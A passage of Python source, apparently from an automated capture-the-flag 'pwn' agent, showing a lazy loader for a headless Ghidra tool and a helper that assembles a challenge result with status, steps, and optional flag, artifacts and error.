        if not os.environ.get("GHIDRA_HOME"):
            return None
        try:
            from tools.pwn.headless_ghidra_tool import HeadlessGhidraTool
            self._ghidra = HeadlessGhidraTool()
        except Exception:
            self._ghidra = None
        return self._ghidra

    # ------------------------------------------------------------------
    # Result builder
    # ------------------------------------------------------------------

    @staticmethod
    def _result(
        challenge: Dict[str, Any],
        status: str,
        steps: List[str],
        flag: Optional[str] = None,
        artifacts: Optional[Dict[str, Any]] = None,
        error: Optional[str] = None,
    ) -> Dict[str, Any]:
        out: Dict[str, Any] = {
            "challenge_id": challenge.get("id"),
            "agent_id": "pwn_agent",
            "status": status,
            "steps": steps,
        }
        if flag is not None:
            out["flag"] = flag
        if artifacts:
            out["artifacts"] = artifacts
        if error:
            out["error"] = error
        return out
